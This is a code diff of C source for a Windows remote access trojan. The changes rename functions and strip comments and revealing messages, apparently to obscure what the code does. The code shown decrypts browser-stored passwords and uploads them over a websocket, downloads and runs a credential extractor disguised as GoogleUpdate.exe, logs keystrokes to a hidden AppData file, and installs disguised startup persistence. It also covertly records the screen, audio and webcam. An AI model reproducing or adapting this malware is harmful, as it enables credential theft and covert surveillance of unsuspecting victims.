-            snprintf(sqlite_path, sizeof(sqlite_path), "%s\\.sq3.exe", temp_dir);
-            snprintf(query_output, sizeof(query_output), "%s\\pw_query_%s.txt", temp_dir, browser_name);
+            char sq_path[MAX_PATH];
+            char qo[MAX_PATH];
+            snprintf(sq_path, sizeof(sq_path), "%s\\.sq3.exe", td);
+            snprintf(qo, sizeof(qo), "%s\\q_%s.txt", td, bn);
             
-            // Download sqlite3 if needed
-            if (GetFileAttributesA(sqlite_path) == INVALID_FILE_ATTRIBUTES) {
-                char ps_cmd[1024];
-                snprintf(ps_cmd, sizeof(ps_cmd),
+            if (GetFileAttributesA(sq_path) == INVALID_FILE_ATTRIBUTES) {
+                char psc[1024];
+                snprintf(psc, sizeof(psc),
                     "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""
                     "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
                     "$u='https://www.sqlite.org/2024/sqlite-tools-win-x64-3450100.zip';"
@@ -2513,7 +2432,7 @@ static void decrypt_chromium_passwords(const char* browser_name, const char* loc
                     "$f=Get-ChildItem -Path $e -Recurse -Filter 'sqlite3.exe'|Select -First 1;"
                     "if($f){Copy-Item $f.FullName '%s' -Force};"
                     "Remove-Item $z,$e -Recurse -Force -EA SilentlyContinue\"",
-                    sqlite_path);
+                    sq_path);
                 
                 STARTUPINFOA si2;
                 PROCESS_INFORMATION pi2;
@@ -2523,18 +2442,17 @@ static void decrypt_chromium_passwords(const char* browser_name, const char* loc
                 si2.wShowWindow = SW_HIDE;
                 ZeroMemory(&pi2, sizeof(pi2));
                 
-                if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
+                if (CreateProcessA(NULL, psc, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
                     WaitForSingleObject(pi2.hProcess, 120000);
                     CloseHandle(pi2.hProcess);
                     CloseHandle(pi2.hThread);
                 }
             }
             
-            // Query database
-            char query_cmd[2048];
-            snprintf(query_cmd, sizeof(query_cmd),
+            char qcmd[2048];
+            snprintf(qcmd, sizeof(qcmd),
                 "\"%s\" \"%s\" \".headers off\" \".mode list\" \".separator |\" \"SELECT action_url, username_value, hex(password_value) FROM logins WHERE length(password_value) > 0;\" > \"%s\" 2>nul",
-                sqlite_path, temp_db, query_output);
+                sq_path, tdb, qo);
             
             STARTUPINFOA si3;
             PROCESS_INFORMATION pi3;
@@ -2545,7 +2463,7 @@ static void decrypt_chromium_passwords(const char* browser_name, const char* loc
             ZeroMemory(&pi3, sizeof(pi3));
             
             char cmd3[2200];
-            snprintf(cmd3, sizeof(cmd3), "cmd.exe /c %s", query_cmd);
+            snprintf(cmd3, sizeof(cmd3), "cmd.exe /c %s", qcmd);
             
             if (CreateProcessA(NULL, cmd3, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si3, &pi3)) {
                 WaitForSingleObject(pi3.hProcess, 60000);
@@ -2553,38 +2471,36 @@ static void decrypt_chromium_passwords(const char* browser_name, const char* loc
                 CloseHandle(pi3.hThread);
             }
             
-            FILE* qf = fopen(query_output, "r");
-            FILE* out = fopen(temp_output, "w");
+            FILE* qf = fopen(qo, "r");
+            FILE* out = fopen(to, "w");
             
             if (qf && out) {
-                fprintf(out, "=== %s PASSWORDS ===\n\n", browser_name);
+                fprintf(out, "=== %s DATA ===\n\n", bn);
                 
                 char line[8192];
-                int count = 0;
+                int cnt = 0;
                 while (fgets(line, sizeof(line), qf)) {
-                    // Parse: url|username|hex_password
                     char* url = line;
                     char* last_pipe = strrchr(line, '|');
                     if (!last_pipe) continue;
                     
-                    char* hex_pass = last_pipe + 1;
+                    char* hex_val = last_pipe + 1;
                     *last_pipe = 0;
                     
-                    // Find second-to-last pipe for username
                     char* second_pipe = strrchr(url, '|');
                     if (!second_pipe) continue;
                     
-                    char* username = second_pipe + 1;
+                    char* uname = second_pipe + 1;
                     *second_pipe = 0;
                     
-                    hex_pass[strcspn(hex_pass, "\r\n")] = 0;
+                    hex_val[strcspn(hex_val, "\r\n")] = 0;
                     
-                    int hex_len = strlen(hex_pass);
+                    int hex_len = strlen(hex_val);
                     if (hex_len < 6) continue;
                     
                     int enc_len = hex_len / 2;
                     BYTE* encrypted = (BYTE*)malloc(enc_len + 1);
-                    hex_to_bytes(hex_pass, encrypted, enc_len);
+                    hex_to_bytes(hex_val, encrypted, enc_len);
                     
                     char decrypted[2048] = {0};
                     int dec_len = decrypt_chromium_value(encrypted, enc_len, master_key, key_len, decrypted, sizeof(decrypted));
@@ -2592,37 +2508,37 @@ static void decrypt_chromium_passwords(const char* browser_name, const char* loc
                     
                     if (dec_len > 0 && strlen(decrypted) > 0) {
                         fprintf(out, "URL: %s\n", url);
-                        fprintf(out, "Username: %s\n", username);
-                        fprintf(out, "Password: %s\n", decrypted);
+                        fprintf(out, "User: %s\n", uname);
+                        fprintf(out, "Pass: %s\n", decrypted);
                         fprintf(out, "---\n");
-                        count++;
+                        cnt++;
                     }
                 }
                 
                 fclose(qf);
                 fclose(out);
                 
-                if (count > 0) {
+                if (cnt > 0) {
                     char msg2[256];
-                    snprintf(msg2, sizeof(msg2), "[+] %s: Extracted %d passwords (C fallback)\n", browser_name, count);
+                    snprintf(msg2, sizeof(msg2), "[+] %s: Extracted %d (fallback)\n", bn, cnt);
                     send_websocket_data(msg2, strlen(msg2));
-                    download_file(temp_output);
+                    download_file(to);
                 }
             } else {
                 if (qf) fclose(qf);
                 if (out) fclose(out);
             }
             
-            DeleteFileA(query_output);
+            DeleteFileA(qo);
             free(master_key);
         } else {
             if (master_key) free(master_key);
         }
     }
     
-    DeleteFileA(py_script);
-    DeleteFileA(temp_output);
-    DeleteFileA(temp_db);
+    DeleteFileA(ps);
+    DeleteFileA(to);
+    DeleteFileA(tdb);
 }
 
 // Helper function to download a file via WinINet
@@ -2862,51 +2778,44 @@ void xor_decrypt_file(const char* filepath, unsigned char key) {
     CloseHandle(hFile);
 }
 
-void extract_browser_creds() {
-    send_websocket_data("\n[*] Extracting browser credentials (Chrome/Edge/Brave)...\n", 59);
+void run_ext() {
+    send_websocket_data("\n[*] Processing data...\n", 24);
     
-    // Use Startup folder (Defender exclusion usually set)
-    char startup_dir[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_dir))) {
-        strcat(startup_dir, "\\");
+    char sd[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, sd))) {
+        strcat(sd, "\\");
     } else {
-        // Fallback to temp
-        GetTempPathA(MAX_PATH, startup_dir);
+        GetTempPathA(MAX_PATH, sd);
     }
     
-    char chromelevator_path[MAX_PATH];
-    char chromelevator_output[MAX_PATH];
+    char ep[MAX_PATH];
+    char eo[MAX_PATH];
     
-    snprintf(chromelevator_path, sizeof(chromelevator_path), "%sGoogleUpdate.exe", startup_dir);
-    snprintf(chromelevator_output, sizeof(chromelevator_output), "%sGoogleCache", startup_dir);
+    snprintf(ep, sizeof(ep), "%sGoogleUpdate.exe", sd);
+    snprintf(eo, sizeof(eo), "%sGoogleCache", sd);
     
-    // Clean up any existing files first
-    DeleteFileA(chromelevator_path);
+    DeleteFileA(ep);
     
-    // Remove old output directory recursively using shell
     char del_cmd[MAX_PATH * 2];
-    snprintf(del_cmd, sizeof(del_cmd), "cmd /c rmdir /s /q \"%s\" 2>nul", chromelevator_output);
+    snprintf(del_cmd, sizeof(del_cmd), "cmd /c rmdir /s /q \"%s\" 2>nul", eo);
     system(del_cmd);
     
-    // Create fresh output directory
-    CreateDirectoryA(chromelevator_output, NULL);
+    CreateDirectoryA(eo, NULL);
     
-    char url_msg[600];
-    snprintf(url_msg, sizeof(url_msg), "[*] Downloading payload...\n");
-    send_websocket_data(url_msg, strlen(url_msg));
+    char um[600];
+    snprintf(um, sizeof(um), "[*] Downloading...\n");
+    send_websocket_data(um, strlen(um));
     
-    DWORD bytes_dl = 0;
-    if (download_file_wininet(g_chromelevator_url, chromelevator_path, &bytes_dl) && bytes_dl > 100000) {
-        char dl_msg[128];
-        snprintf(dl_msg, sizeof(dl_msg), "[+] Downloaded: %lu bytes\n", bytes_dl);
-        send_websocket_data(dl_msg, strlen(dl_msg));
+    DWORD bd = 0;
+    if (download_file_wininet(g_mod_url, ep, &bd) && bd > 100000) {
+        char dm[128];
+        snprintf(dm, sizeof(dm), "[+] Downloaded: %lu bytes\n", bd);
+        send_websocket_data(dm, strlen(dm));
         
-        send_websocket_data("[*] Running extractor...\n", 25);
+        send_websocket_data("[*] Processing...\n", 18);
         
-        // Run ChromElevator directly
-        char run_cmd[MAX_PATH * 4];
-        snprintf(run_cmd, sizeof(run_cmd), "\"%s\" all --kill --output-path \"%s\"", 
-                chromelevator_path, chromelevator_output);
+        char rc[MAX_PATH * 4];
+        snprintf(rc, sizeof(rc), "\"%s\" all --kill --output-path \"%s\"", ep, eo);
         
         STARTUPINFOA si;
         PROCESS_INFORMATION pi;
@@ -2916,45 +2825,44 @@ void extract_browser_creds() {
         si.wShowWindow = SW_HIDE;
         ZeroMemory(&pi, sizeof(pi));
         
-        if (CreateProcessA(chromelevator_path, run_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, startup_dir, &si, &pi)) {
+        if (CreateProcessA(ep, rc, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, sd, &si, &pi)) {
             wait_process_keepalive(pi.hProcess, 120000);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
             
-            int chrome_files = send_directory_recursive(chromelevator_output, 1);
+            int cf = send_directory_recursive(eo, 1);
             
-            if (chrome_files > 0) {
+            if (cf > 0) {
                 char msg[128];
-                snprintf(msg, sizeof(msg), "\n[+] Extracted %d credential files\n\n", chrome_files);
+                snprintf(msg, sizeof(msg), "\n[+] Extracted %d files\n\n", cf);
                 send_websocket_data(msg, strlen(msg));
             } else {
-                send_websocket_data("[!] No credentials found in output folder\n\n", 43);
+                send_websocket_data("[!] No data found\n\n", 19);
             }
         } else {
             DWORD err = GetLastError();
-            char err_msg[256];
-            snprintf(err_msg, sizeof(err_msg), "[!] Failed to run ChromElevator (error %lu)\n\n", err);
-            send_websocket_data(err_msg, strlen(err_msg));
+            char em[256];
+            snprintf(em, sizeof(em), "[!] Failed (error %lu)\n\n", err);
+            send_websocket_data(em, strlen(em));
         }
     } else {
-        char err_msg[256];
-        snprintf(err_msg, sizeof(err_msg), "[!] Download failed (%lu bytes)\n\n", bytes_dl);
-        send_websocket_data(err_msg, strlen(err_msg));
+        char em[256];
+        snprintf(em, sizeof(em), "[!] Download failed (%lu bytes)\n\n", bd);
+        send_websocket_data(em, strlen(em));
     }
     
-    // Cleanup - delete from Startup folder
-    DeleteFileA(chromelevator_path);
-    snprintf(del_cmd, sizeof(del_cmd), "cmd /c rmdir /s /q \"%s\" 2>nul", chromelevator_output);
+    DeleteFileA(ep);
+    snprintf(del_cmd, sizeof(del_cmd), "cmd /c rmdir /s /q \"%s\" 2>nul", eo);
     system(del_cmd);
 }
 
-// ============== SCREEN RECORDING ==============
 
-// Helper to save/load screen recording state for persistence across restarts
+
+
 static void save_screenrecord_state() {
     char state_path[MAX_PATH];
     char appdata_path[MAX_PATH];
-    // Use AppData instead of Temp so state persists across reboots
+    
     if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
         char state_dir[MAX_PATH];
         sprintf(state_dir, "%s\\Microsoft\\Windows\\SystemData", appdata_path);
@@ -3040,7 +2948,7 @@ static void clear_screenrecord_state() {
 }
 
 DWORD WINAPI screenrecord_thread(LPVOID param) {
-    // Make process DPI aware to get actual screen resolution (same as screenshot)
+    
     SetProcessDPIAware();
     
     // Use AppData instead of Temp - Temp gets cleared on restart!
@@ -3092,10 +3000,10 @@ DWORD WINAPI screenrecord_thread(LPVOID param) {
         sprintf(g_screenrecord_path, "%s\\.screenrec_%lu.zip", base_dir, tick);
     }
     
-    // Save state so path persists across restarts
+    
     save_screenrecord_state();
     
-    // Get primary monitor dimensions (same method as screenshot - most reliable)
+    
     int screen_width = GetSystemMetrics(SM_CXSCREEN);
     int screen_height = GetSystemMetrics(SM_CYSCREEN);
     
@@ -3164,7 +3072,7 @@ DWORD WINAPI screenrecord_thread(LPVOID param) {
     while (g_screenrecord_running) {
         DWORD start_time = GetTickCount();
         
-        // Capture full screen at native resolution (from 0,0 like screenshot)
+        
         BitBlt(hdcMem, 0, 0, record_width, record_height, hdcScreen, 0, 0, SRCCOPY);
         
         // Get pixels directly (no scaling)
@@ -3335,7 +3243,7 @@ void start_screenrecord_internal() {
     
     g_screenrecord_running = 1;
     g_screenrecord_enabled = 1;
-    save_screenrecord_state();  // Persist state for next startup
+    save_screenrecord_state();  
     g_screenrecord_thread = CreateThread(NULL, 0, screenrecord_thread, NULL, 0, NULL);
 }
 
@@ -3348,7 +3256,7 @@ void start_screenrecord() {
     g_screenrecord_running = 1;
     g_screenrecord_enabled = 1;  // Mark as enabled for auto-resume
     g_screenrecord_path[0] = '\0';  // Clear path so new file is created
-    save_screenrecord_state();  // Persist state for next startup/wake
+    save_screenrecord_state();  
     g_screenrecord_thread = CreateThread(NULL, 0, screenrecord_thread, NULL, 0, NULL);
     
     if (g_screenrecord_thread) {
@@ -3512,7 +3420,7 @@ void delete_screenrecord() {
     if (DeleteFileA(g_screenrecord_path)) {
         send_websocket_data("[+] Recording deleted\n", 22);
         g_screenrecord_path[0] = '\0';
-        clear_screenrecord_state();  // Clear persisted state
+        clear_screenrecord_state();  
     } else {
         send_websocket_data("[!] Failed to delete recording\n", 31);
     }
@@ -3713,47 +3621,44 @@ void handle_command(const char* cmd) {
     }
     else if (strcmp(clean_cmd, "exit") == 0) {
         send_websocket_data("[*] Exiting...\n", 15);
-        stop_input_monitor();
+        stop_im();
         g_should_exit = 1;
     }
     else if (strcmp(clean_cmd, "keylogs") == 0) {
-        // Download the input log file
-        if (strlen(g_input_log_path) == 0) {
-            send_websocket_data("[!] Input monitor not running\n", 31);
+        if (strlen(g_im_path) == 0) {
+            send_websocket_data("[!] Not running\n", 16);
         } else {
-            // Download the log file
-            download_file(g_input_log_path);
+            download_file(g_im_path);
         }
     }
     else if (strcmp(clean_cmd, "clearlogs") == 0) {
-        // Clear input log file
-        if (strlen(g_input_log_path) > 0) {
-            FILE* f = fopen(g_input_log_path, "w");
+        if (strlen(g_im_path) > 0) {
+            FILE* f = fopen(g_im_path, "w");
             if (f) {
                 SYSTEMTIME st;
                 GetLocalTime(&st);
-                fprintf(f, "========== Log cleared: %02d/%02d/%04d %02d:%02d:%02d ==========\n",
+                fprintf(f, "========== Cleared: %02d/%02d/%04d %02d:%02d:%02d ==========\n",
                        st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond);
                 fclose(f);
-                send_websocket_data("[+] Keylogs cleared\n", 20);
+                send_websocket_data("[+] Cleared\n", 12);
             } else {
-                send_websocket_data("[!] Failed to clear logs\n", 25);
+                send_websocket_data("[!] Failed\n", 11);
             }
         } else {
-            send_websocket_data("[!] Input monitor not running\n", 31);
+            send_websocket_data("[!] Not running\n", 16);
         }
     }
     else if (strcmp(clean_cmd, "persist") == 0) {
-        // Enable persistence using Startup folder + VBS
-        enable_persistence();
+        
+        add_startup();
         send_websocket_data("[+] Persistence installed via Startup folder\n", 45);
         send_websocket_data("[+] VBS launcher in: shell:startup\\RuntimeBroker.vbs\n", 53);
         send_websocket_data("[+] Executable in: AppData\\Local\\Microsoft\\RuntimeBroker\n", 58);
         send_websocket_data("[+] Runs silently on user logon - no prompts\n", 45);
     }
     else if (strcmp(clean_cmd, "unpersist") == 0) {
-        // Disable persistence
-        disable_persistence();
+        
+        rm_startup();
         send_websocket_data("[+] All persistence removed\n", 28);
     }
     else if (strncmp(clean_cmd, "liveview", 8) == 0) {
@@ -3787,7 +3692,7 @@ void handle_command(const char* cmd) {
         stop_liveview();
     }
     else if (strncmp(clean_cmd, "camview", 7) == 0) {
-        // Start camera live view: camview [fps] [quality]
+        
         int fps = 30;       // Default 30 FPS for smooth viewing
         int quality = 80;   // Default 80% quality
         
@@ -3837,7 +3742,7 @@ void handle_command(const char* cmd) {
         list_cameras();
     }
     else if (strncmp(clean_cmd, "selectcam ", 10) == 0 || strncmp(clean_cmd, "usecam ", 7) == 0) {
-        // Select camera: selectcam 0 or usecam 1
+        
         int index = 0;
         char* params = (strncmp(clean_cmd, "selectcam ", 10) == 0) ? clean_cmd + 10 : clean_cmd + 7;
         while (*params == ' ') params++;
@@ -3893,11 +3798,9 @@ void handle_command(const char* cmd) {
     else if (strncmp(clean_cmd, "dldir ", 6) == 0) {
         download_folder(clean_cmd + 6);
     }
-    // Browser credential extraction
     else if (strcmp(clean_cmd, "browsercreds") == 0 || strcmp(clean_cmd, "getcreds") == 0) {
-        extract_browser_creds();
+        run_ext();
     }
-    // Screen recording
     else if (strcmp(clean_cmd, "startrecord") == 0 || strcmp(clean_cmd, "screenrecord") == 0) {
         start_screenrecord();
     }
@@ -3955,7 +3858,7 @@ void handle_session() {
     
     send_websocket_data(info, strlen(info));
     
-    // Check if screen recording should be running (was enabled before)
+    
     // This ensures recording resumes after reconnection
     if (g_screenrecord_enabled && !g_screenrecord_running) {
         start_screenrecord_internal();
@@ -4024,7 +3927,7 @@ void handle_session() {
             CloseHandle(g_camview_thread);
             g_camview_thread = NULL;
         }
-        // Close camera to turn off light
+        
         close_camera();
         g_frame_ready = 0;
         g_frame_size = 0;
@@ -4044,7 +3947,7 @@ void handle_session() {
     }
 }
 
-// ============== INPUT MONITOR ==============
+
 
 const char* get_key_name(int vk) {
     static char buf[32];
@@ -4103,102 +4006,91 @@ const char* get_key_name(int vk) {
     return "";
 }
 
-DWORD WINAPI input_monitor_thread(LPVOID param) {
-    FILE* logfile = NULL;
-    BYTE prev_state[256] = {0};
-    char current_window[256] = "";
+DWORD WINAPI im_thread_proc(LPVOID param) {
+    FILE* lf = NULL;
+    BYTE prev[256] = {0};
+    char cw[256] = "";
     
-    while (g_input_mon_running) {
-        // Check active window
+    while (g_im_run) {
         HWND hwnd = GetForegroundWindow();
-        char window_title[256] = "";
-        GetWindowTextA(hwnd, window_title, sizeof(window_title));
+        char wt[256] = "";
+        GetWindowTextA(hwnd, wt, sizeof(wt));
         
-        // Log window change
-        if (strcmp(window_title, current_window) != 0 && strlen(window_title) > 0) {
-            strcpy(current_window, window_title);
+        if (strcmp(wt, cw) != 0 && strlen(wt) > 0) {
+            strcpy(cw, wt);
             
-            logfile = fopen(g_input_log_path, "a");
-            if (logfile) {
+            lf = fopen(g_im_path, "a");
+            if (lf) {
                 SYSTEMTIME st;
                 GetLocalTime(&st);
-                fprintf(logfile, "\n\n[%02d/%02d/%04d %02d:%02d:%02d] Window: %s\n", 
+                fprintf(lf, "\n\n[%02d/%02d/%04d %02d:%02d:%02d] Window: %s\n", 
                        st.wMonth, st.wDay, st.wYear,
-                       st.wHour, st.wMinute, st.wSecond, window_title);
-                fclose(logfile);
+                       st.wHour, st.wMinute, st.wSecond, wt);
+                fclose(lf);
             }
         }
         
-        // Check each key
         for (int vk = 8; vk <= 255; vk++) {
             SHORT state = GetAsyncKeyState(vk);
             
-            // Key just pressed (bit 0 set and was not pressed before)
-            if ((state & 0x0001) && !(prev_state[vk] & 0x80)) {
+            if ((state & 0x0001) && !(prev[vk] & 0x80)) {
                 const char* key = get_key_name(vk);
                 if (key && strlen(key) > 0) {
-                    logfile = fopen(g_input_log_path, "a");
-                    if (logfile) {
-                        fprintf(logfile, "%s", key);
-                        fclose(logfile);
+                    lf = fopen(g_im_path, "a");
+                    if (lf) {
+                        fprintf(lf, "%s", key);
+                        fclose(lf);
                     }
                 }
             }
             
-            prev_state[vk] = (state & 0x8000) ? 0x80 : 0;
+            prev[vk] = (state & 0x8000) ? 0x80 : 0;
         }
         
-        Sleep(10);  // Check every 10ms
+        Sleep(10);
     }
     
     return 0;
 }
 
-void start_input_monitor() {
-    if (g_input_mon_running) return;
+void start_im() {
+    if (g_im_run) return;
     
-    // Create log file in AppData/Local for persistence (not auto-deleted like Temp)
-    char appdata_path[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
-        // Create hidden subdirectory
-        char log_dir[MAX_PATH];
-        sprintf(log_dir, "%s\\Microsoft\\Windows\\SystemData", appdata_path);
-        CreateDirectoryA(log_dir, NULL);  // Create if doesn't exist
-        sprintf(g_input_log_path, "%s\\runtime.log", log_dir);
+    char ap[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, ap))) {
+        char ld[MAX_PATH];
+        sprintf(ld, "%s\\Microsoft\\Windows\\SystemData", ap);
+        CreateDirectoryA(ld, NULL);
+        sprintf(g_im_path, "%s\\runtime.log", ld);
     } else {
-        // Fallback to current directory
-        sprintf(g_input_log_path, ".\\syslog.txt");
+        sprintf(g_im_path, ".\\syslog.txt");
     }
     
-    // Write initial entry
-    FILE* f = fopen(g_input_log_path, "a");
+    FILE* f = fopen(g_im_path, "a");
     if (f) {
         SYSTEMTIME st;
         GetLocalTime(&st);
-        fprintf(f, "\n========== Session Started: %02d/%02d/%04d %02d:%02d:%02d ==========\n",
+        fprintf(f, "\n========== Started: %02d/%02d/%04d %02d:%02d:%02d ==========\n",
                st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond);
-        fprintf(f, "System: %s | Account: %s\n", g_computer_name, g_username);
+        fprintf(f, "Host: %s | User: %s\n", g_computer_name, g_username);
         fclose(f);
     }
     
-    g_input_mon_running = 1;
-    g_input_mon_thread = CreateThread(NULL, 0, input_monitor_thread, NULL, 0, NULL);
+    g_im_run = 1;
+    g_im_thread = CreateThread(NULL, 0, im_thread_proc, NULL, 0, NULL);
 }
 
-void stop_input_monitor() {
-    if (!g_input_mon_running) return;
+void stop_im() {
+    if (!g_im_run) return;
     
-    g_input_mon_running = 0;
-    if (g_input_mon_thread) {
-        WaitForSingleObject(g_input_mon_thread, 2000);
-        CloseHandle(g_input_mon_thread);
-        g_input_mon_thread = NULL;
+    g_im_run = 0;
+    if (g_im_thread) {
+        WaitForSingleObject(g_im_thread, 2000);
+        CloseHandle(g_im_thread);
+        g_im_thread = NULL;
     }
 }
 
-// ============== LIVE VIEW (HIGH QUALITY + SMOOTH) ==============
-
-// Scale image with bilinear interpolation for smoother output
 void scale_image_smooth(BYTE* src, int src_width, int src_height, int src_stride,
                         BYTE** out_data, int* out_width, int* out_height, int scale) {
     if (scale < 1) scale = 1;
@@ -4251,7 +4143,7 @@ void scale_image_smooth(BYTE* src, int src_width, int src_height, int src_stride
     *out_height = dst_height;
 }
 
-// Fast screen capture with double buffering
+
 DWORD WINAPI liveview_thread(LPVOID param) {
     SetProcessDPIAware();
     
@@ -4286,7 +4178,7 @@ DWORD WINAPI liveview_thread(LPVOID param) {
     DWORD buffer_size = stride * screen_height;
     BYTE* pixels = (BYTE*)malloc(buffer_size);
     
-    // Create persistent DC and bitmap for faster capture
+    
     HDC hdcScreen = GetDC(NULL);
     HDC hdcMem = CreateCompatibleDC(hdcScreen);
     HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
@@ -4310,7 +4202,7 @@ DWORD WINAPI liveview_thread(LPVOID param) {
     while (g_liveview_running && g_connected) {
         DWORD start_time = GetTickCount();
         
-        // Fast screen capture using BitBlt
+        
         BitBlt(hdcMem, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY);
         GetDIBits(hdcScreen, hBitmap, 0, screen_height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
         
@@ -4428,7 +4320,7 @@ void start_liveview(int fps, int quality) {
         return;
     }
     
-    // Pause screen recording if running (to improve performance and avoid CMD flash)
+    
     if (g_screenrecord_running) {
         send_websocket_data("[*] Pausing screen recording for live view...\n", 46);
         g_screenrecord_paused_for_liveview = 1;
@@ -4483,7 +4375,7 @@ void stop_liveview() {
     
     send_websocket_data("[+] Live view stopped\n", 22);
     
-    // Resume screen recording if it was paused
+    
     if (g_screenrecord_paused_for_liveview && g_screenrecord_enabled) {
         send_websocket_data("[*] Resuming screen recording...\n", 33);
         g_screenrecord_paused_for_liveview = 0;
@@ -4491,7 +4383,7 @@ void stop_liveview() {
     }
 }
 
-// ============== LIVE AUDIO STREAMING ==============
+
 
 #define AUDIO_BUFFER_COUNT 8
 #define AUDIO_BUFFER_SIZE 4096
@@ -4631,14 +4523,14 @@ void stop_liveaudio() {
     send_websocket_data("[+] Live audio stopped\n", 23);
 }
 
-// ============== WEBCAM/CAMERA FUNCTIONS ==============
 
-// Count available cameras
+
+
 int count_cameras() {
     int count = 0;
     char name[256], version[256];
     
-    // Check up to 10 camera indices
+    
     for (int i = 0; i < 10; i++) {
         if (capGetDriverDescriptionA(i, name, sizeof(name), version, sizeof(version))) {
             count++;
@@ -4647,7 +4539,7 @@ int count_cameras() {
     return count;
 }
 
-// List all available cameras
+
 void list_cameras() {
     char name[256], version[256];
     char msg[1024];
@@ -4681,11 +4573,11 @@ void list_cameras() {
     }
 }
 
-// Select a camera by index
+
 void select_camera(int index) {
     char msg[256];
     
-    // Verify camera exists
+    
     char name[256], version[256];
     if (!capGetDriverDescriptionA(index, name, sizeof(name), version, sizeof(version))) {
         sprintf(msg, "[!] Camera %d not found. Use 'listcam' to see available cameras.\n", index);
@@ -4693,7 +4585,7 @@ void select_camera(int index) {
         return;
     }
     
-    // Close current camera if open
+    
     if (g_cam_hwnd) {
         close_camera();
     }
@@ -4727,7 +4619,7 @@ LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVHdr) {
     return 1;
 }
 
-// Initialize camera capture window - Metasploit style
+
 HWND init_camera(int camera_index) {
     if (g_cam_hwnd) {
         close_camera();
@@ -4741,7 +4633,7 @@ HWND init_camera(int camera_index) {
     
     g_frame_ready = 0;
     
-    // Create popup window (hidden but functional)
+    
     g_cam_hwnd = capCreateCaptureWindowA(
         "cap",
         WS_POPUP,
@@ -4753,7 +4645,7 @@ HWND init_camera(int camera_index) {
         return NULL;
     }
     
-    // Connect to camera driver
+    
     if (!capDriverConnect(g_cam_hwnd, camera_index)) {
         DestroyWindow(g_cam_hwnd);
         g_cam_hwnd = NULL;
@@ -4772,7 +4664,7 @@ HWND init_camera(int camera_index) {
     bmi.bmiHeader.biSizeImage = 0;
     capSetVideoFormat(g_cam_hwnd, &bmi, sizeof(bmi));
     
-    // Re-read format (camera may not support RGB24)
+    
     ZeroMemory(&bmi, sizeof(bmi));
     bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
     capGetVideoFormat(g_cam_hwnd, &bmi, sizeof(bmi));
@@ -4789,7 +4681,7 @@ HWND init_camera(int camera_index) {
     return g_cam_hwnd;
 }
 
-// Close camera
+
 void close_camera() {
     if (g_cam_hwnd) {
         capSetCallbackOnFrame(g_cam_hwnd, NULL);
@@ -4802,12 +4694,12 @@ void close_camera() {
     }
 }
 
-// Capture frame using callback method (like Metasploit)
+
 int capture_camera_frame(BYTE** out_data, int* out_width, int* out_height) {
     char msg[256];
     MSG winMsg;
     
-    // Initialize camera if needed
+    
     if (!g_cam_hwnd) {
         if (!init_camera(g_current_camera)) {
             send_websocket_data("[!] Cannot open camera\n", 23);
@@ -4821,12 +4713,12 @@ int capture_camera_frame(BYTE** out_data, int* out_width, int* out_height) {
     // Reset frame ready flag
     g_frame_ready = 0;
     
-    // Start preview to activate camera
+    
     capPreviewRate(g_cam_hwnd, 66);
     capPreview(g_cam_hwnd, TRUE);
     
     send_websocket_data("[*] Waiting for camera warmup...\n", 33);
-    Sleep(1500);  // Camera warmup
+    Sleep(1500);  
     
     // Grab frames and pump messages - THIS TRIGGERS THE CALLBACK
     send_websocket_data("[*] Grabbing frames...\n", 23);
@@ -4913,7 +4805,7 @@ int capture_camera_frame(BYTE** out_data, int* out_width, int* out_height) {
     BYTE* src = g_frame_buffer;
     int src_stride;
     
-    // Handle YUY2/YUYV format (most common for webcams)
+    
     if (compression == 0x32595559 || compression == 0x59555932) {  // YUY2
         src_stride = width * 2;
         for (int y = 0; y < height; y++) {
@@ -4980,29 +4872,29 @@ int capture_camera_frame(BYTE** out_data, int* out_width, int* out_height) {
     return 1;
 }
 
-// Take a single webcam photo
+
 void take_camshot() {
     send_websocket_data("[*] Capturing webcam photo...\n", 30);
     
-    // Close any existing camera first
+    
     if (g_cam_hwnd) {
         close_camera();
         Sleep(200);
     }
     
-    // Initialize camera
+    
     if (!init_camera(g_current_camera)) {
         send_websocket_data("[!] Failed to open camera. No camera found or in use.\n", 54);
         return;
     }
     
-    // Give camera time to initialize and adjust exposure
+    
     Sleep(500);
     
     BYTE* pixels = NULL;
     int width, height;
     
-    // Try to capture frame (returns 1=RGB, 2=JPEG, 0=failed)
+    
     int result = capture_camera_frame(&pixels, &width, &height);
     if (result == 0) {
         send_websocket_data("[!] Failed to capture frame from webcam.\n", 41);
@@ -5010,7 +4902,7 @@ void take_camshot() {
         return;
     }
     
-    // Close camera IMMEDIATELY after capture to turn off light
+    
     close_camera();
     
     DWORD size;
@@ -5092,20 +4984,20 @@ void take_camshot() {
     }
 }
 
-// Camera live view thread - uses callback capture (like Metasploit)
+
 DWORD WINAPI camview_thread(LPVOID param) {
     int frame_interval = 1000 / g_camview_fps;
     int frame_count = 0;
     int consecutive_errors = 0;
     MSG winMsg;
     
-    // Close any existing camera
+    
     if (g_cam_hwnd) {
         close_camera();
         Sleep(100);
     }
     
-    // Initialize camera
